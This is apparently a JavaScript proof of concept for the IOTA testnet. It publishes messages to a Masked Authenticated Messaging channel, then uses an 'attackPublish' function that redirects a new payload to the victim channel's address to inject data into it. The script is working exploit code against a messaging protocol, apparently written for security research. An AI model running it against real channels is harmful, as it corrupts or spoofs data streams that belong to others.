var fetch = require('node-fetch')
var crypto = require('crypto')
var Mam = require('./mam.node.js')
var IOTA = require('iota.lib.js')

var iota = new IOTA({ provider: `https://nodes.testnet.iota.org:443/` })

// Random Key Generator
const keyGen = length => {
    var charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ9'
    var values = crypto.randomBytes(length)
    var result = new Array(length)
    for (var i = 0; i < length; i++) {
    result[i] = charset[values[i] % charset.length]
    }
    return result.join('')
}


// Generate seed
let seed = keyGen(81)

// Initialise MAM State
let mamState = Mam.init(iota, seed)

console.log ("seed: " + seed)

// Publish to tangle
const normalPublish = async packet => {
    // Create Trytes
    var trytes = iota.utils.toTrytes(JSON.stringify(packet))
    // Get MAM payload
    var message = Mam.create(mamState, trytes)
    // Save new mamState
    mamState = message.state

    // Attach the payload.
    await Mam.attach(message.payload, message.address)
    console.log("Root: " + message.root)
    console.log("Address: " + message.address)

    return message.root

}

const attackPublish = async (packet, victimAddress) => {
    // Create Trytes
    var trytes = iota.utils.toTrytes(JSON.stringify(packet))
    // Get MAM payload
    var message = Mam.create(mamState, trytes)
    // Save new mamState
    mamState = message.state

    // attack
    message.address = victimAddress
    console.log("Victim address is " + myroot)

    // Attach the payload.
    await Mam.attach(message.payload, message.address)
    console.log("Root: " + message.root)
    console.log("Address: " + message.address)

    return message.root

}


// Callback used to pass data out of the fetch
const logData = data => console.log(JSON.parse(iota.utils.fromTrytes(data)))

const listen = async myroot => {
    // Callback used to pass data + returns next_root
    var resp = await Mam.fetch(myroot, 'public', null, logData)
    console.log(JSON.stringify(resp))
}


let myroot

const execute = async () => {
    myroot = await normalPublish("AAA")
    await normalPublish("BBB")
    await normalPublish("CCC")

    await listen(myroot)

    console.log("-----------attack root------------")

    await attackPublish("XXX", myroot)

    console.log("------------now try to read again---------------------")
    await listen(myroot)
}

execute()









